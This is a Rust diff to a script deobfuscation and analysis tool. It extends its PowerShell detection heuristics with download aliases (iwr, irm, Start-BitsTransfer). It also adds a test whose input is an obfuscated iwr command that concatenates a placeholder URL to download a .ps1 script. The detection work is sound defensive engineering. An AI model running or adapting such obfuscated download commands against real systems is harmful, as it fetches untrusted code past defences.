@@ -12009,6 +12009,11 @@ fn starts_like_standalone_powershell(lower: &str) -> bool {
         || first.starts_with("invoke-expression")
         || first.starts_with("invoke-webrequest")
         || first.starts_with("invoke-restmethod")
+        || first.starts_with("iwr ")
+        || first.starts_with("iwr(")
+        || first.starts_with("irm ")
+        || first.starts_with("irm(")
+        || first.starts_with("start-bitstransfer")
 }
 
 fn scriptblock_create_string_literals(text: &str) -> Vec<String> {
@@ -14900,6 +14905,11 @@ fn looks_like_powershell_payload_bytes(bytes: &[u8]) -> bool {
         || lower.contains("new-object")
         || lower.contains("frombase64string")
         || lower.contains("downloadstring")
+        || lower.contains("start-bitstransfer")
+        || lower.contains("iwr ")
+        || lower.contains("iwr(")
+        || lower.contains("irm ")
+        || lower.contains("irm(")
         || lower.contains('$')
 }
 
@@ -26120,6 +26130,31 @@ mod inline_if_tests {
         assert!(
             report.deobfuscated.contains("echo good"),
             "else branch did not run, got:\n{}",
+            report.deobfuscated
+        );
+    }
+}
+
+#[cfg(test)]
+mod standalone_powershell_input_tests {
+    use crate::traits::Trait;
+    use crate::{analyze, Config};
+
+    #[test]
+    fn alias_starting_obfuscated_iwr_script_gets_structured_download() {
+        let script = br#"iwr ('ht' + 'tps://standalone-iwr-concat.example/a.ps1') -OutFile a.ps1"#;
+
+        let report = analyze(script.as_slice(), &Config::default());
+
+        assert!(
+            report.traits.iter().any(|t| matches!(
+                t,
+                Trait::Download { src, dst, .. }
+                    if src == "https://standalone-iwr-concat.example/a.ps1"
+                        && dst.as_deref() == Some("a.ps1")
+            )),
+            "alias-starting standalone PS was not structured as a download: {:?}\ndeob:\n{}",
+            report.traits,
             report.deobfuscated
         );
     }
